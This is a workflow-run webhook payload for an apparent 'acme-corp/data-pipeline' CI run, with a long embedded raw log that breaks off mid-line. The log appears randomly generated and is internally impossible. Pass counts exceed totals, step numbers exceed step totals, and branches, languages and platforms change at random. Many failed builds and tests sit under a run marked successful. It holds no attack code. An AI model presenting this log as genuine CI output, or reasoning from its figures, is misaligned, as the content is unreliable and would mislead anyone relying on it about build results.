{
  "action": "completed",
  "workflow_run": {
    "id": 572,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-574",
    "head_sha": "b6c2cb978811d9f91f67bf364b4a8b3b3f4d2569",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-16T12:19:14.898085Z",
    "updated_at": "2025-12-16T12:22:05.894750Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\nCache invalidated: node_modules\nProcessing...\nCache miss for key-9696\nStep 12/18: Testing\n[12:19:14] INFO: Request completed\nPOST /data - 200 (227ms)\nSuccess!\nnpm notice: package.json updated\n  PASS: test_user_create (59ms)\n[12:19:14] DEBUG: Query executed in 36ms\n  PASS: test_api_health (191ms)\nCompiling src/app.ts...\nTests: 186 passed, 431 total\nArtifact uploaded: build.tar.gz (4MB)\nCache restored successfully (247MB)\nStep 17/22: Deploying\nTests: 103 passed, 119 total\nCompiling components/index.js...\nArtifact uploaded: dist.zip (41MB)\nnpm install: resolved 525 packages\nConnection established\nGenerating source maps...\nSwitched to branch 'hotfix/task-455'\nSnapshots: 42 passed, 26 total\nGenerating source maps...\nCache restored successfully (132MB)\n[12:19:14] ERROR: Connection failed\nDone.\n[12:19:14] DEBUG: Memory usage: 1115MB\n[12:19:14] INFO: Connecting to database\nStep 1/22: Installing dependencies\nCompleted.\n[12:19:14] INFO: Connecting to database\nMinifying app.js\nProcessing...\n[12:19:14] DEBUG: Memory usage: 1041MB\nTLS handshake completed\nCreating production build...\nStep 16/25: Testing\n[12:19:14] INFO: Cache refreshed\nCompiling lib/service.java...\nnpm notice: created a lockfile\nSuccess!\nWARNING: eslint has known vulnerabilities\nVerifying...\n[12:19:14] INFO: Starting build process\nOptimizing 55 modules...\n[12:19:14] DEBUG: Memory usage: 463MB\nStep 16/20: Testing\nSwitched to branch 'bugfix/task-649'\n[12:19:14] INFO: Starting build process\nPulling image: alpine:latest\nLoading...\nCache invalidated: node_modules\nConnection established\nCompiling utils/main.py...\npip: Downloading react-5.10.tar.gz\nPulling image: alpine:18\npip install: Successfully installed express-5.10\nCache restored successfully (173MB)\nPulling image: alpine:3.11\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\n\u2713 Step 'install' succeeded\npip: Downloading react-1.4.tar.gz\nInstalling eslint@4.3.5\nTransforming 478 files...\nTest Suites: 25 passed, 38 total\n[12:19:14] WARN: Deprecated API usage\nStep 10/22: Testing\nCompiling src/index.js...\n[12:19:14] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\nMinifying vendor.js\nArtifact downloaded: 14MB\nBuilding Docker image...\n[12:19:14] ERROR: Connection failed\nStep 16/22: Linting\n[12:19:14] INFO: Request completed\n\u2717 build failed with exit code 114\n[12:19:14] INFO: Processing request\nCache miss for key-9784\n[12:19:14] WARN: Deprecated API usage\nnpm install: resolved 1660 packages\nWARNING: axios has known vulnerabilities\nTransforming 850 files...\n[12:19:14] INFO: Cache refreshed\n\u2717 build failed with exit code 41\n  PASS: integration/test_db_connect.spec.js\nSuccess!\n[12:19:14] DEBUG: Query executed in 55ms\nFetching submodules...\nEnvironment: development\nnpm notice: package.json updated\n[12:19:14] DEBUG: Loading configuration\n[12:19:14] INFO: Connecting to database\nNODE_ENV=production\nSnapshots: 10 passed, 1 total\n\u2713 build completed\n\u2717 build failed with exit code 73\n  PASS: e2e/test_cache_hit.spec.js\npip: Collecting jest\n\u2713 All checks passed\nnpm notice: package.json updated\n[12:19:14] INFO: Starting build process\nStep 11/15: Installing dependencies\nTime: 48.345s\nFinished.\nCompiling components/utils.go...\nLoading...\nStep 6/23: Running migrations\nTest Suites: 9 passed, 50 total\nException: ValueError\n[12:19:14] DEBUG: Memory usage: 1463MB\nNODE_ENV=production\nCompiling src/index.js...\nChecking out develop branch\nFetching submodules...\nTests: 66 passed, 484 total\nBuilding Docker image...\nCache invalidated: build\nCompiling src/index.js...\nConnection established\nGET /api - 204 (40ms)\nEnvironment: test\nCompleted.\nnpm install: resolved 641 packages\nWARNING: react has known vulnerabilities\n[12:19:14] INFO: Processing request\nRan 93 tests in 7s\nnpm install: resolved 1372 packages\nConnection established\npip: Downloading webpack-3.10.tar.gz\nCoverage: 94% statements, 70% branches\nStep 1/19: Running migrations\nCache restored successfully (369MB)\nCoverage: 97% statements, 82% branches\nTest Suites: 42 passed, 34 total\nStep 5/16: Running migrations\nFetching submodules...\n[12:19:14] INFO: Starting build process\nCache saved successfully\nCompiling lib/app.ts...\nCache saved successfully\nBundling styles.css\nNODE_ENV=production\nTLS handshake completed\nCache restored successfully (108MB)\nyarn add: Done in 19.56s\nCoverage: 84% statements, 64% branches\nPlatform: linux-x64\nWARNING: prettier has known vulnerabilities\nCoverage: 76% statements, 60% branches\n[12:19:14] INFO: Request completed\nCache hit for key-9129\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nSwitched to branch 'hotfix/task-877'\nGET /health - 201 (90ms)\nInstalling axios@1.15.9\npip: Downloading jest-3.4.tar.gz\n[12:19:14] DEBUG: Loading configuration\nCompiling lib/app.ts...\nChecking out main branch\nSnapshots: 5 passed, 31 total\nStep 14/20: Building\nStep 5/22: Installing dependencies\nStep 16/21: Testing\npip: Installing build dependencies...\nPlatform: linux-x64\nStep 12/22: Building\npip: Installing build dependencies...\nImage pulled successfully\nPOST /data - 200 (453ms)\n[12:19:14] INFO: Cache refreshed\nUploading artifact 'build' (31 files)\nBuilding Docker image...\n[12:19:14] WARN: Deprecated API usage\nStep 13/15: Installing dependencies\nTLS handshake completed\nFetching submodules...\nnpm notice: created a lockfile\nGenerating source maps...\n[12:19:14] INFO: Starting build process\npip install: Successfully installed webpack-4.11\n\u2713 Task completed in 2430ms\nCache invalidated: node_modules\nWaiting...\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (6MB)\nTLS handshake completed\nTests: 192 passed, 309 total\n  PASS: e2e/test_api_health.spec.js\nStep 2/17: Linting\nnpm install: added 212 packages\nCompiling components/service.java...\nStep 15/25: Installing dependencies\nCache miss for key-1914\nArtifact uploaded: dist.zip (24MB)\nVerifying...\nCompleted.\n\u2713 build completed\nStep 16/17: Linting\nConnection established\nChecking out master branch\nUsing Node.js 19.19.6\nLayer 5/12: RUN command\nHEAD is now at 7560b3d\nUsing Node.js 20.7.7\nConnection established\nPushing to registry...\nStep 10/24: Testing\npip: Installing build dependencies...\nTests: 59 passed, 193 total\nOptimizing 53 modules...\nEnvironment: test\nnpm install: added 385 packages\nnpm install: added 355 packages\nnpm install: resolved 435 packages\n  PASS: test_user_create (66ms)\nStep 11/17: Running migrations\nCompiling components/service.java...\nTests: 332 passed, 244 total\n  PASS: e2e/test_auth_login.spec.js\nImage pulled successfully\nArtifact uploaded: dist.zip (15MB)\nStep 19/25: Linting\nnpm notice: created a lockfile\nException: TypeError\nSuccess!\n[12:19:14] DEBUG: Connection pool: 17 active\nLoading...\npip: Downloading axios-4.19.tar.gz\nTest Suites: 48 passed, 30 total\nCompiling src/main.py...\n[12:19:14] DEBUG: Query executed in 74ms\nCache restored successfully (282MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 13/23: Running migrations\nPushing to registry...\nMinifying app.js\nOptimizing 31 modules...\nOK\nArtifact uploaded: dist.zip (26MB)\nPOST /api - 201 (222ms)\n[12:19:14] DEBUG: Memory usage: 1815MB\nnpm install: added 396 packages\n\u2713 validate completed\n[12:19:14] DEBUG: Memory usage: 611MB\nnpm install: resolved 186 packages\nException: ValueError\nCache invalidated: node_modules\nnpm install: resolved 1309 packages\nRan 177 tests in 54s\nStep 3/18: Building\nStep 13/22: Deploying\nnpm install: added 216 packages\nStep 19/18: Running migrations\nTLS handshake completed\nBuilding Docker image...\nStep 19/25: Testing\nWaiting...\nCache miss for key-5846\nTLS handshake completed\n[12:19:14] INFO: Cache refreshed\n\u2713 Task completed in 321ms\nFinished.\n[12:19:14] INFO: Starting build process\nMinifying vendor.js\nVerifying...\nnpm install: added 318 packages\n[12:19:14] INFO: Request completed\nEnvironment: production\nWARNING: lodash has known vulnerabilities\npip install: Successfully installed jest-1.3\nWARNING: axios has known vulnerabilities\n[12:19:14] DEBUG: Memory usage: 1269MB\nBuilding Docker image...\n  PASS: unit/test_api_health.spec.js\nUsing Python 3.10\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (354ms)\n\u2713 All checks passed\nCompleted.\nPlatform: win32-x64\nFinished.\nConnecting to test.io:443...\n\u2713 Task completed in 2921ms\nOK\nRan 94 tests in 9s\nGenerating source maps...\nMinifying app.js\nCache restored successfully (386MB)\nTest Suites: 11 passed, 26 total\nnpm notice: package.json updated\npip install: Successfully installed axios-5.18\nCache restored successfully (206MB)\nOK\npip: Collecting eslint\n[12:19:14] INFO: Request completed\n[12:19:14] DEBUG: Memory usage: 590MB\nReady.\nWARNING: eslint has known vulnerabilities\nFetching submodules...\nTime: 57.361s\nConnecting to cloud.services:443...\nPOST /data - 202 (198ms)\n\u2717 build failed with exit code 19\nException: ValueError\nCompleted.\npip: Installing build dependencies...\nSnapshots: 41 passed, 35 total\n=== Step save_cache completed ===\n=== Step: lint ===\n\u2713 All checks passed\nUsing Node.js 15.20.2\nSwitched to branch 'hotfix/task-126'\nConnecting to acme.corp:443...\nnpm install: added 491 packages\nnpm install: resolved 1159 packages\nArtifact uploaded: dist.zip (89MB)\n\u2717 build failed with exit code 112\nRan 47 tests in 15s\nTransforming 724 files...\nStep 18/21: Testing\n[12:19:14] INFO: Starting build process\n[12:19:14] INFO: Cache refreshed\nTest Suites: 38 passed, 33 total\nCreating production build...\nCompiling lib/service.java...\nProcessing...\nLayer 6/14: ENV command\nCompiling src/handler.rs...\nOptimizing 64 modules...\nCompiling lib/app.ts...\nException: TypeError\n[12:19:14] INFO: Request completed\nTLS handshake completed\n\u2713 Step 'test' succeeded\nCoverage: 74% statements, 75% branches\nPlatform: darwin-arm64\nyarn add: Done in 6.72s\npip: Installing build dependencies...\n\u2713 lint completed\nCache hit for key-3617\nUploading artifact 'dist' (20 files)\nOK\nCache hit for key-2892\nnpm install: added 99 packages\nImage pulled successfully\nCache miss for key-8482\n\u2713 lint completed\nAlready up to date.\nPulling image: python:3.11\nStep 19/24: Deploying\n\u2713 All checks passed\nTest Suites: 12 passed, 45 total\npip: Downloading jest-4.4.tar.gz\nReady.\nOK\n\u2717 build failed with exit code 20\n[12:19:14] DEBUG: Query executed in 85ms\nFetching submodules...\nWARNING: webpack has known vulnerabilities\n[12:19:14] WARN: Deprecated API usage\nCache miss for key-9118\nWARNING: jest has known vulnerabilities\nLayer 1/13: COPY command\nCompiling components/app.ts...\nPOST /api - 200 (22ms)\n[12:19:14] DEBUG: Query executed in 18ms\nWaiting...\nSuccess!\n\u2717 build failed with exit code 21\npip: Installing build dependencies...\nnpm install: added 91 packages\n\u2713 Task completed in 2364ms\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\n\u2713 All checks passed\nInstalling webpack@3.4.1\npip install: Successfully installed react-5.16\n[12:19:14] DEBUG: Connection pool: 14 active\n[12:19:14] DEBUG: Connection pool: 1 active\nTransforming 884 files...\nChecking out develop branch\nSnapshots: 44 passed, 18 total\npip install: Successfully installed webpack-5.19\nnpm notice: package.json updated\nWaiting...\nBundling main.css\nCreating production build...\nStep 2/21: Testing\nVerifying...\n[12:19:14] INFO: Request completed\npip: Installing build dependencies...\nCache restored successfully (95MB)\nUsing Node.js 14.2.6\nCache hit for key-9534\nStep 20/23: Linting\n  PASS: test_db_connect (80ms)\nSnapshots: 28 passed, 23 total\n[12:19:14] INFO: Cache refreshed\n\u2713 Task completed in 4255ms\nSuccess!\nInstalling axios@1.8.9\nChecking out develop branch\nTime: 38.794s\n[12:19:14] INFO: Request completed\npip: Downloading jest-1.19.tar.gz\nTransforming 632 files...\nCompiling lib/app.ts...\nCompiling lib/handler.rs...\nTests: 227 passed, 96 total\npip install: Successfully installed axios-3.1\nOK\nNODE_ENV=development\n  PASS: test_cache_hit (70ms)\nChecking out main branch\nChecking out master branch\nCompiling lib/main.py...\nCache saved successfully\nFinished.\n[12:19:14] DEBUG: Memory usage: 1125MB\nSwitched to branch 'feature/task-264'\nArtifact uploaded: dist.zip (97MB)\nOptimizing 26 modules...\nConnection established\n[12:19:14] INFO: Request completed\npip install: Successfully installed express-3.18\n[12:19:14] DEBUG: Loading configuration\nEnvironment: test\nHEAD is now at 1a732cc\nOK\nnpm install: added 355 packages\n\u2713 Task completed in 1387ms\nCompiling lib/service.java...\nUsing Node.js 14.19.7\nVerifying...\nBuilding Docker image...\n[12:19:14] DEBUG: Connection pool: 12 active\nCache miss for key-4406\nCreating production build...\nMinifying main.js\nCompiling lib/utils.go...\nTransforming 982 files...\n\u2713 Step 'setup' succeeded\nFinished.\nStep 5/22: Linting\nTest Suites: 28 passed, 33 total\nTransforming 962 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\n\u2713 Task completed in 2022ms\n[12:19:14] WARN: Deprecated API usage\npip install: Successfully installed react-5.20\nChecking out main branch\nUsing Python 3.11\nCache invalidated: dependencies\nCompleted.\nInstalling express@1.4.0\n[12:19:14] INFO: Starting build process\nTime: 28.488s\n[12:19:14] DEBUG: Initializing service\nReady.\nLayer 8/14: RUN command\nCompiling utils/handler.rs...\nWaiting...\nImage pulled successfully\n=== Step lint completed ===\n=== Step: upload_artifacts ===\npip: Collecting lodash\nAlready up to date.\nArtifact downloaded: 19MB\nSuccess!\npip: Downloading react-1.0.tar.gz\nGenerating source maps...\nCache saved successfully\nStep 16/24: Installing dependencies\n[12:19:14] DEBUG: Connection pool: 1 active\nProcessing...\nCompiling utils/index.js...\nVerifying...\nTime: 40.25s\npip: Collecting eslint\nImage pulled successfully\nCache invalidated: dependencies\nChecking out master branch\nOptimizing 97 modules...\nCoverage: 100% statements, 87% branches\n\u2713 Step 'checkout' succeeded\nLoading...\npip: Installing build dependencies...\nLoading...\n\u2713 build completed\n[12:19:14] INFO: Connecting to database\nOptimizing 66 modules...\nTLS handshake completed\nFetching submodules...\n[12:19:14] INFO: Connecting to database\nChecking out master branch\nGenerating source maps...\nCreating production build...\nProcessing...\n[12:19:14] WARN: Deprecated API usage\nPulling image: alpine:latest\nCoverage: 92% statements, 74% branches\nnpm notice: created a lockfile\nStep 16/21: Installing dependencies\n[12:19:14] ERROR: Connection failed\nCache miss for key-6652\nTest Suites: 27 passed, 49 total\nLoading...\nProcessing...\nTests: 380 passed, 52 total\n[12:19:14] DEBUG: Connection pool: 19 active\nTLS handshake completed\nBuilding Docker image...\nCompiling lib/utils.go...\nCompiling lib/service.java...\n[12:19:14] INFO: Starting build process\nConnection established\nPlatform: win32-x64\nStep 13/24: Testing\nWaiting...\n[12:19:14] INFO: Processing request\npip install: Successfully installed lodash-2.0\n[12:19:14] INFO: Request completed\n\u2713 Task completed in 346ms\nTime: 48.538s\n[12:19:14] WARN: Deprecated API usage\nFAILED: test_api_health\npip install: Successfully installed express-3.11\nStep 20/16: Testing\nTest Suites: 45 passed, 45 total\nSnapshots: 46 passed, 14 total\nLayer 4/9: ENV command\nnpm install: added 159 packages\nnpm notice: package.json updated\nCompiling src/app.ts...\nCache restored successfully (211MB)\nStep 1/22: Building\npip: Downloading axios-2.12.tar.gz\npip: Collecting express\nInstalling express@4.19.5\nProcessing...\nnpm install: added 32 packages\nWaiting...\nVerifying...\nCache saved successfully\nReady.\npip: Downloading eslint-5.16.tar.gz\n\u2713 All checks passed\nCompiling src/handler.rs...\nVerifying...\n[12:19:14] DEBUG: Loading configuration\nLoading...\nArtifact downloaded: 50MB\nWARNING: react has known vulnerabilities\nHEAD is now at d2d37fb\n\u2713 Step 'install' succeeded\n[12:19:14] INFO: Cache refreshed\nCache invalidated: node_modules\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /api - 201 (412ms)\nStep 3/16: Installing dependencies\nLoading...\nStep 8/17: Running migrations\n[12:19:14] WARN: Deprecated API usage\nException: RuntimeError\nWaiting...\nCompiling src/handler.rs...\nStep 4/18: Linting\nnpm notice: package.json updated\nnpm notice: created a lockfile\nnpm notice: package.json updated\nBuilding Docker image...\nNODE_ENV=development\nnpm install: added 73 packages\nInstalling prettier@3.14.5\nStep 9/25: Testing\n\u2713 Step 'checkout' succeeded\nPushing to registry...\nCache restored successfully (158MB)\n[12:19:14] DEBUG: Initializing service\nBundling runtime.js\nChecking out develop branch\n\u2713 All checks passed\nStep 11/15: Testing\nCompiling utils/handler.rs...\nUploading artifact 'build' (34 files)\nCompiling utils/index.js...\n[12:19:14] DEBUG: Loading configuration\nEnvironment: test\nTests: 425 passed, 219 total\nCache miss for key-1898\nSwitched to branch 'hotfix/task-728'\nCache restored successfully (59MB)\nCache restored successfully (262MB)\nGET /api - 204 (50ms)\nHEAD is now at 2e032ab\nMinifying vendor.js\nEnvironment: production\nArtifact uploaded: build.tar.gz (20MB)\n[12:19:14] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-692'\n[12:19:14] WARN: Deprecated API usage\nException: RuntimeError\n\u2713 test completed\n[12:19:14] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (5MB)\n[12:19:14] DEBUG: Loading configuration\nFinished.\nCache hit for key-9769\nUploading artifact 'dist' (8 files)\nPOST /upload - 201 (387ms)\nCache hit for key-2918\nMinifying app.js\nStep 13/18: Installing dependencies\nInstalling webpack@3.14.6\nCreating production build...\nArtifact uploaded: build.tar.gz (46MB)\nConnection established\nProcessing...\npip: Collecting express\nNODE_ENV=development\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nConnection established\nArtifact downloaded: 13MB\nStep 1/23: Linting\nArtifact uploaded: build.tar.gz (13MB)\nWARNING: jest has known vulnerabilities\nConnecting to cloud.services:443...\nStep 16/17: Deploying\nCompiling lib/index.js...\nTest Suites: 28 passed, 48 total\nRan 44 tests in 28s\nLoading...\nCompleted.\n[12:19:14] WARN: Deprecated API usage\n[12:19:14] WARN: Deprecated API usage\n[12:19:14] INFO: Processing request\n[12:19:14] INFO: Request completed\n[12:19:14] INFO: Starting build process\nWaiting...\n[12:19:14] DEBUG: Query executed in 71ms\nTests: 350 passed, 148 total\nReady.\n[12:19:14] INFO: Cache refreshed\nLayer 6/12: ENV command\npip: Collecting jest\npip install: Successfully installed express-4.14\nLoading...\nPOST /data - 200 (47ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:14] INFO: Request completed\nConnection established\nnpm install: resolved 1888 packages\nCache miss for key-6238\nFinished.\nSnapshots: 46 passed, 39 total\nSwitched to branch 'feature/task-153'\n[12:19:14] DEBUG: Query executed in 77ms\nStep 17/23: Installing dependencies\nCache hit for key-6428\nFetching submodules...\n[12:19:14] DEBUG: Connection pool: 20 active\nPlatform: linux-x64\nGenerating source maps...\nLayer 2/15: COPY command\nCache miss for key-8806\nOK\n[12:19:14] INFO: Cache refreshed\nStep 18/15: Linting\nWARNING: lodash has known vulnerabilities\nFetching submodules...\n[12:19:14] DEBUG: Initializing service\nVerifying...\nLayer 1/11: ENV command\nnpm notice: created a lockfile\n[12:19:14] DEBUG: Query executed in 27ms\nStep 11/18: Building\nVerifying...\nReady.\n\u2713 All checks passed\nPulling image: alpine:3.11\nFinished.\n[12:19:14] DEBUG: Initializing service\nBundling vendor.css\npip: Downloading webpack-4.18.tar.gz\nFetching submodules...\nGenerating source maps...\nPushing to registry...\nCache hit for key-2048\nWaiting...\n[12:19:14] WARN: Deprecated API usage\nTests: 285 passed, 400 total\n[12:19:14] INFO: Processing request\n[12:19:14] INFO: Cache refreshed\nImage pulled successfully\nFetching submodules...\nWARNING: react has known vulnerabilities\nPOST /data - 202 (134ms)\nyarn add: Done in 17.44s\nStep 9/17: Installing dependencies\nHEAD is now at f3a02f2\n\u2713 package completed\nEnvironment: production\nSnapshots: 12 passed, 7 total\nStep 15/23: Linting\nOK\nFinished.\n\u2713 All checks passed\n  PASS: e2e/test_auth_login.spec.js\n[12:19:14] INFO: Processing request\nnpm notice: package.json updated\nReady.\nGenerating source maps...\nInstalling prettier@5.5.6\npip: Downloading express-2.13.tar.gz\nBuilding Docker image...\nCompiling components/index.js...\nArtifact downloaded: 14MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nException: ValueError\n  PASS: test_user_create (381ms)\nMinifying main.js\nCache hit for key-6153\nImage pulled successfully\nAlready up to date.\nPOST /api - 201 (218ms)\npip: Installing build dependencies...\nTest Suites: 36 passed, 22 total\nSnapshots: 21 passed, 38 total\nTime: 65.705s\nInstalling prettier@5.8.1\nCache restored successfully (444MB)\nHEAD is now at decb410\nImage pulled successfully\n[12:19:14] INFO: Request completed\nWaiting...\n[12:19:14] WARN: Deprecated API usage\nUsing Python 3.11\nCompleted.\nArtifact uploaded: dist.zip (27MB)\nnpm notice: package.json updated\n\u2713 Step 'build' succeeded\nCoverage: 99% statements, 66% branches\nCoverage: 89% statements, 78% branches\nnpm notice: package.json updated\nUsing Node.js 15.9.2\nFinished.\n\u2717 build failed with exit code 12\nnpm notice: package.json updated\npip install: Successfully installed prettier-1.7\nnpm install: resolved 180 packages\npip: Collecting react\n\u2717 build failed with exit code 13\nGenerating source maps...\n[12:19:14] INFO: Starting build process\nBuilding Docker image...\nLayer 6/15: ENV command\nArtifact uploaded: dist.zip (54MB)\nNODE_ENV=production\nArtifact downloaded: 46MB\nOptimizing 31 modules...\nSwitched to branch 'bugfix/task-721'\nHEAD is now at b7d8f13\nWaiting...\nArtifact downloaded: 19MB\nLayer 5/9: COPY command\n[12:19:14] WARN: Deprecated API usage\n  PASS: test_db_connect (40ms)\nCache hit for key-2448\nPushing to registry...\nFAILED: test_db_connect\n[12:19:14] INFO: Connecting to database\nEnvironment: staging\nnpm install: resolved 1239 packages\nException: RuntimeError\nInstalling webpack@5.1.8\n=== Step setup_node completed ===\n=== Step: integration_tests ===\nLoading...\nDone.\nPlatform: linux-x64\n\u2713 Task completed in 2710ms\nStep 14/24: Building\n[12:19:14] INFO: Request completed\n[12:19:14] DEBUG: Initializing service\nOptimizing 59 modules...\nArtifact uploaded: dist.zip (26MB)\nArtifact downloaded: 30MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\n[12:19:14] DEBUG: Connection pool: 3 active\nFAILED: test_api_health\nBundling styles.js\nArtifact uploaded: build.tar.gz (49MB)\nOptimizing 20 modules...\nyarn add: Done in 22.23s\nSnapshots: 11 passed, 48 total\nTLS handshake completed\nnpm notice: created a lockfile\nStep 15/21: Linting\nCache saved successfully\nUploading artifact 'build' (10 files)\n[12:19:14] WARN: Deprecated API usage\nRan 122 tests in 50s\nProcessing...\nStep 5/17: Running migrations\n\u2713 test completed\nMinifying app.js\n[12:19:14] INFO: Starting build process\npip: Downloading axios-1.12.tar.gz\nStep 8/15: Building\nImage pulled successfully\npip: Installing build dependencies...\nDone.\n[12:19:14] DEBUG: Connection pool: 6 active\n  PASS: test_api_health (69ms)\nArtifact uploaded: dist.zip (76MB)\nStep 11/15: Building\nSwitched to branch 'feature/task-285'\nPlatform: darwin-arm64\nTime: 91.911s\nFAILED: test_user_create\nWARNING: jest has known vulnerabilities\nPushing to registry...\nStep 6/16: Linting\nnpm install: resolved 434 packages\nFinished.\npip: Downloading webpack-2.2.tar.gz\nProcessing...\n\u2713 deploy completed\npip: Installing build dependencies...\nnpm notice: package.json updated\nNODE_ENV=production\nCache invalidated: build\nLoading...\npip: Collecting jest\npip install: Successfully installed axios-1.7\nCompiling lib/service.java...\nBuilding Docker image...\nGET /health - 201 (7ms)\n[12:19:14] INFO: Request completed\nSuccess!\nProcessing...\nRan 160 tests in 12s\nTests: 465 passed, 347 total\nFAILED: test_auth_login\nImage pulled successfully\nArtifact downloaded: 40MB\nCache invalidated: build\nArtifact uploaded: dist.zip (23MB)\nWaiting...\nReady.\n  PASS: test_auth_login (33ms)\nConnection established\nDone.\nLayer 9/15: COPY command\n\u2713 test completed\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/21: Running migrations\nVerifying...\nPulling image: node:3.11\nNODE_ENV=development\nStep 5/17: Deploying\nStep 5/18: Deploying\npip: Installing build dependencies...\nCache hit for key-3596\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\n[12:19:14] INFO: Cache refreshed\nStep 8/22: Running migrations\nLayer 5/10: ENV command\npip: Downloading express-3.3.tar.gz\nLoading...\n\u2713 All checks passed\nLoading...\nCreating production build...\nException: NullPointerException\n[12:19:14] WARN: Deprecated API usage\nEnvironment: staging\nBuilding Docker image...\nWaiting...\n[12:19:14] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nLayer 8/10: COPY command\nFinished.\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\n[12:19:14] DEBUG: Query executed in 45ms\nStep 19/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nBuilding Docker image...\nStep 4/19: Deploying\nStep 17/23: Testing\n\u2713 Task completed in 2525ms\nCoverage: 92% statements, 67% branches\n[12:19:14] DEBUG: Memory usage: 667MB\nTime: 39.878s\n[12:19:14] DEBUG: Initializing service\n[12:19:14] DEBUG: Memory usage: 142MB\nCache saved successfully\nTime: 69.848s\nDone.\n\u2713 Step 'test' succeeded\nCompleted.\n\u2713 validate completed\n[12:19:14] INFO: Cache refreshed\nCache invalidated: node_modules\npip: Collecting webpack\nException: TypeError\nPOST /data - 202 (181ms)\nCoverage: 95% statements, 100% branches\nGET /health - 204 (54ms)\nOptimizing 75 modules...\nnpm install: added 113 packages\n[12:19:14] DEBUG: Loading configuration\nCompleted.\nArtifact downloaded: 23MB\nInstalling express@5.19.9\n\u2713 All checks passed\npip install: Successfully installed jest-1.1\n[12:19:14] INFO: Starting build process\nFinished.\n\u2713 Task completed in 4991ms\nStep 10/25: Running migrations\nRan 115 tests in 54s\nRan 168 tests in 37s\nNODE_ENV=production\nCompiling lib/index.js...\nWaiting...\nPulling image: alpine:18\n=== Step integration_tests completed ===\n=== Step: checkout ===\nUsing Node.js 18.10.10\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\npip: Downloading jest-3.11.tar.gz\nStep 20/17: Testing\nnpm install: added 352 packages\nDone.\nLayer 2/13: RUN command\n[12:19:14] INFO: Cache refreshed\nFetching submodules...\nArtifact uploaded: build.tar.gz (5MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/main.py...\nCompiling lib/service.java...\nBuilding Docker image...\nArtifact downloaded: 33MB\nCompiling src/app.ts...\npip: Collecting react\nCompiling components/handler.rs...\nTest Suites: 14 passed, 36 total\nProcessing...\nFinished.\npip: Downloading prettier-1.5.tar.gz\n[12:19:14] INFO: Request completed\nPulling image: python:latest\nGenerating source maps...\nStep 10/25: Deploying\npip: Collecting react\nStep 7/21: Testing\nStep 6/24: Testing\nConnecting to cloud.services:443...\nTest Suites: 50 passed, 9 total\nFAILED: test_auth_login\npip: Downloading lodash-3.20.tar.gz\nTLS handshake completed\nPulling image: python:3.11\nPulling image: python:3.11\nTLS handshake completed\n\u2713 build completed\nCompleted.\nOK\nPOST /data - 200 (443ms)\nArtifact downloaded: 48MB\nEnvironment: production\nFinished.\nTest Suites: 28 passed, 36 total\nWARNING: webpack has known vulnerabilities\nCache restored successfully (36MB)\nConnection established\nWaiting...\nCompiling lib/handler.rs...\nFinished.\n[12:19:14] DEBUG: Memory usage: 1851MB\nCache miss for key-2369\nBundling vendor.js\nNODE_ENV=test\nPOST /data - 200 (100ms)\nFinished.\npip install: Successfully installed prettier-1.16\nConnection established\nArtifact uploaded: build.tar.gz (4MB)\nTLS handshake completed\n[12:19:14] DEBUG: Memory usage: 1659MB\nCoverage: 100% statements, 60% branches\nException: NullPointerException\n  PASS: test_cache_hit (355ms)\n\u2713 All checks passed\nSnapshots: 50 passed, 7 total\nGET /status - 200 (34ms)\nStep 4/20: Linting\nEnvironment: staging\nFAILED: test_auth_login\nDone.\npip install: Successfully installed webpack-1.9\n[12:19:14] INFO: Processing request\nTLS handshake completed\nInstalling webpack@4.9.4\n\u2713 Step 'build' succeeded\nyarn add: Done in 11.94s\nConnection established\nSnapshots: 3 passed, 5 total\nDone.\nCache saved successfully\nLoading...\nHEAD is now at 8e94dad\nTest Suites: 18 passed, 34 total\nCoverage: 98% statements, 84% branches\n[12:19:14] ERROR: Connection failed\n[12:19:14] INFO: Request completed\nChecking out main branch\n[12:19:14] INFO: Request completed\nSwitched to branch 'feature/task-485'\npip: Collecting react\nCompiling components/handler.rs...\nImage pulled successfully\n\u2713 Task completed in 1501ms\nConnecting to example.com:443...\nTests: 87 passed, 246 total\nnpm notice: created a lockfile\nCache invalidated: dependencies\nCompleted.\npip: Downloading jest-4.12.tar.gz\nStep 16/20: Testing\n[12:19:14] INFO: Request completed\nStep 7/18: Linting\nChecking out main branch\nLoading...\nCompiling utils/utils.go...\nLayer 8/10: RUN command\nLayer 9/9: ENV command\n\u2713 All checks passed\nSnapshots: 46 passed, 50 total\nnpm install: resolved 925 packages\n[12:19:14] INFO: Request completed\nPOST /data - 202 (302ms)\nDone.\n[12:19:14] INFO: Request completed\nCache miss for key-7553\nWaiting...\nTransforming 940 files...\nCache miss for key-4954\nHEAD is now at eb68488\nCache saved successfully\nLayer 4/15: RUN command\nChecking 